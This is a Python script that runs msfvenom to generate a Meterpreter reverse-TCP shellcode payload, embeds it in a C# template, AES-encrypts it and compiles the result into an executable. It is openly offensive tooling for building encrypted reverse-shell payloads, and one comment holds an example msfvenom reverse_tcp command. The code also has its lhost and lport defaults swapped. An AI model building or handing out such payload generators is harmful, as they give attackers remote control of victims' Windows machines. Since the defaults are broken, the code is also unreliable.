#!/usr/bin/env python3
import argparse, subprocess, os

def main():
	args = parse_args()
	lhost = args.lhost
	lport = args.lport
	key = args.key
	payload = args.payload
	filename = args.filename

	''' generate msfvenom payload '''
	print("[+] Generating MSFVENOM payload...")
	result = subprocess.run(['msfvenom',
		'-p', payload,
		'LPORT=' + lport,
		'LHOST=' + lhost,
		'-f', 'csharp'],
		capture_output=True)

	buf = result.stdout.decode('utf-8')

	''' insert buf into template'''
	print("[+] Generating .cs file...")
	template = get_template()
	template = template.replace('~BUF~', buf)
	template =  template.replace('~KEY~', key)

	'''save template to .cs file'''
	f = open("./launcher.cs", "w")
	f.write(template)
	f.close()

	'''compile file'''
	print("[+] Compiling the launcher...")
	os.system("mcs ./launcher.cs /out:" + filename + ">/dev/null");
	print("[+] File compiled and written to ./" + filename);

def parse_args():
	parser = argparse.ArgumentParser()

	parser.add_argument("-k", "--key", default="l33tcrpyto", type=str,
		help="The key used to encrypt the msfvenom payload.")
	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
		help="The local port that msfconsole is listening on.")
	parser.add_argument("-i", "--lhost", default="4444", type=str,
			help="The local host that msfconsole is listening on.")
	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
		help="The payload to generate in msfvenom.")
	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
		help="The filename of the executable.")

	return parser.parse_args()

def get_template():
	return '''
using System;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace Launcher
{
    static class Program
    {
        static void Main()
        {
            // replace with your own shellcode
            // e.g. msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
            ~BUF~

            // remember to use your own key to encrypt the shellcode
            string b64 = Encrypt("~KEY~", buf);
            Console.WriteLine(b64);
            Console.ReadLine();
        }

        static string Encrypt(string key, byte[] data)
        {
            byte[] tempKey = Encoding.UTF8.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            // encrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform enc = aes.CreateEncryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, enc, CryptoStreamMode.Write))
                {
                    csEncrypt.Write(data, 0, data.Length);
                    csEncrypt.FlushFinalBlock();

                    return Convert.ToBase64String(msEncrypt.ToArray());
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}

'''

if __name__ == '__main__':
	main()
